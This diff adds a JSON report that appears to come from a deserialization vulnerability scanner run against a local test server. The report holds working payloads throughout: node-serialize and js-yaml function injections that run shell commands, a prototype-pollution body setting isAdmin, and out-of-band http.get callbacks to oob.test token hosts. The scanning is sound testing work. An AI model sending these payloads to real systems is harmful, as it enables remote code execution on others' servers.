@@ -1,0 +1,456 @@
+{
+    "target": "localhost:8089",
+    "disclaimer": "All findings are Suspected — the tool flags candidates and never auto-confirms; verify each manually.",
+    "stats": {
+        "vectors_scanned": 19,
+        "after_filter": 5,
+        "findings": 5,
+        "dynamic_strong": 0,
+        "oob": {
+            "status": "ran",
+            "collector": "http://172.27.32.1:9000",
+            "base_domain": "oob.test",
+            "tokens_polled": 5,
+            "confirmed": 0
+        }
+    },
+    "findings": [
+        {
+            "url": "http://localhost:8089/api/import",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "345145609482",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function(){return 1;}"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "Observation: response length changed by +29 bytes (baseline=102 mutated=131, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.84) (baseline='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}' mutated='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'id\\');}()\"}}')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +29 bytes (baseline=102 mutated=131, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.84) (baseline='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}' mutated='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'id\\');}()\"}}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 102,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 131,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\"}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +33 bytes (baseline=102 mutated=135, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.83) (baseline='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}' mutated='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'whoami\\');}()\"}}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 102,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 135,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()\"}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +35 bytes (baseline=102 mutated=137, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.82) (baseline='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}' mutated='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'hostname\\');}()\"}}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 102,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 137,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()\"}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://345145609482.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response length changed significantly: baseline=102 mutated=173 (response merely reflects the injected payload — weak)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 102,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 173,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require('http').get('http://345145609482.oob.test/').on('error',function(){});}()\"}}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8089/api/import-config",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "198cbc08d9a0",
+            "type": "NodeJS",
+            "subtype": "Prototype Pollution",
+            "confidence": "Medium",
+            "exploit_type": "Prototype Pollution",
+            "suggested_probe": "proto_pollution",
+            "severity": "High",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "__proto__ detected — try polluting Object.prototype",
+            "normalized": [
+                "{\"theme\":\"dark\",\"lang\":\"en\",\"__proto__\":{\"note\":\"demo\"}}"
+            ],
+            "mutations_count": 1,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "prototype_pollution",
+                    "chain": "__proto__ injection",
+                    "payload": "{\"theme\": \"dark\", \"lang\": \"en\", \"__proto__\": {\"isAdmin\": true, \"polluted\": true}}",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 104,
+                        "body_sample": "{\"success\":true,\"config\":{\"theme\":\"dark\",\"lang\":\"en\",\"pollutionProof\":{\"isAdmin\":null,\"polluted\":null}}}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8089/api/restore-prefs",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "57401a91b8f5",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function(){return 1;}"
+            ],
+            "mutations_count": 4,
+            "indicators": [
+                "Observation: response length changed by +29 bytes (baseline=102 mutated=131, same status 200) — possible behavioral change, verify manually",
+                "Response content differs in a small, localized way despite same status (similarity=0.84) (baseline='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}' mutated='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'id\\');}()\"}}')"
+            ],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +29 bytes (baseline=102 mutated=131, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.84) (baseline='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}' mutated='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'id\\');}()\"}}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 102,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 131,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\"}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +33 bytes (baseline=102 mutated=135, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.83) (baseline='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}' mutated='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'whoami\\');}()\"}}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 102,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 135,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()\"}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [
+                        "Observation: response length changed by +35 bytes (baseline=102 mutated=137, same status 200) — possible behavioral change, verify manually",
+                        "Response content differs in a small, localized way despite same status (similarity=0.82) (baseline='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}' mutated='{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'hostname\\');}()\"}}')"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 102,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 137,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()\"}}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://57401a91b8f5.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [
+                        "Response length changed significantly: baseline=102 mutated=173 (response merely reflects the injected payload — weak)"
+                    ],
+                    "baseline": {
+                        "status": 200,
+                        "length": 102,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){return 1;}\"}}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 173,
+                        "body_sample": "{\"success\":true,\"restored\":{\"theme\":\"dark\",\"lang\":\"en\",\"render\":\"_$$ND_FUNC$$_function(){require('http').get('http://57401a91b8f5.oob.test/').on('error',function(){});}()\"}}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8089/api/import-async",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "a4468392b38f",
+            "type": "NodeJS",
+            "subtype": "node-serialize RCE",
+            "confidence": "High",
+            "exploit_type": "node-serialize RCE",
+            "suggested_probe": "node_serialize",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+            "normalized": [
+                "_$$ND_FUNC$$_function(){return 1;}"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_rce",
+                    "chain": "node-serialize IIFE",
+                    "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                },
+                {
+                    "payload_type": "node_serialize_oob",
+                    "chain": "node-serialize IIFE: http.get",
+                    "payload": "_$$ND_FUNC$$_function(){require('http').get('http://a4468392b38f.oob.test/').on('error',function(){});}()",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    },
+                    "mutated": {
+                        "status": 200,
+                        "length": 15,
+                        "body_sample": "{\"queued\":true}"
+                    }
+                }
+            ]
+        },
+        {
+            "url": "http://localhost:8089/api/import-yaml",
+            "method": "POST",
+            "location": "raw_body",
+            "name": "payload",
+            "occurrences": 1,
+            "oob_token": "67fab7e3149d",
+            "type": "YAML",
+            "subtype": "YAML JS Function RCE (js-yaml)",
+            "confidence": "High",
+            "exploit_type": "YAML JS Function RCE (js-yaml)",
+            "suggested_probe": "yaml_exec",
+            "severity": "Critical",
+            "severity_note": null,
+            "evidence": "dynamic-weak",
+            "notes": "Matched: YAML JS Function RCE (js-yaml) (pattern: !!js/(?:function|undefined|regexp)|!<tag:yaml\\.org,2002:js/) | Vulnerable only with an unsafe loader (yaml.load / YAML.unsafe_load / Psych object mode), not a safe_load",
+            "normalized": [
+                "name: default\nonLoad: !<tag:yaml.org,2002:js/function> \"function(){return true}\"\nenabled: true"
+            ],
+            "mutations_count": 4,
+            "indicators": [],
+            "attempts": [
+                {
+                    "payload_type": "yaml_js_function",
+                    "chain": "js-yaml !!js/function",
+                    "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('id').toString() }\"",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 400,
+                        "length": 31,
+                        "body_sample": "{\"error\":\"invalid YAML config\"}"
+                    },
+                    "mutated": {
+                        "status": 400,
+                        "length": 31,
+                        "body_sample": "{\"error\":\"invalid YAML config\"}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_js_function",
+                    "chain": "js-yaml !!js/function",
+                    "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('whoami').toString() }\"",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 400,
+                        "length": 31,
+                        "body_sample": "{\"error\":\"invalid YAML config\"}"
+                    },
+                    "mutated": {
+                        "status": 400,
+                        "length": 31,
+                        "body_sample": "{\"error\":\"invalid YAML config\"}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_js_function",
+                    "chain": "js-yaml !!js/function",
+                    "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('child_process').execSync('hostname').toString() }\"",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 400,
+                        "length": 31,
+                        "body_sample": "{\"error\":\"invalid YAML config\"}"
+                    },
+                    "mutated": {
+                        "status": 400,
+                        "length": 31,
+                        "body_sample": "{\"error\":\"invalid YAML config\"}"
+                    }
+                },
+                {
+                    "payload_type": "yaml_js_function_oob",
+                    "chain": "js-yaml !!js/function: http.get",
+                    "payload": "hook: !<tag:yaml.org,2002:js/function> \"function(){ return global.process.mainModule.require('http').get('http://67fab7e3149d.oob.test/').on('error',function(){}); }\"",
+                    "signal": "weak",
+                    "indicators": [],
+                    "baseline": {
+                        "status": 400,
+                        "length": 31,
+                        "body_sample": "{\"error\":\"invalid YAML config\"}"
+                    },
+                    "mutated": {
+                        "status": 400,
+                        "length": 31,
+                        "body_sample": "{\"error\":\"invalid YAML config\"}"
+                    }
+                }
+            ]
+        }
+    ]
+}
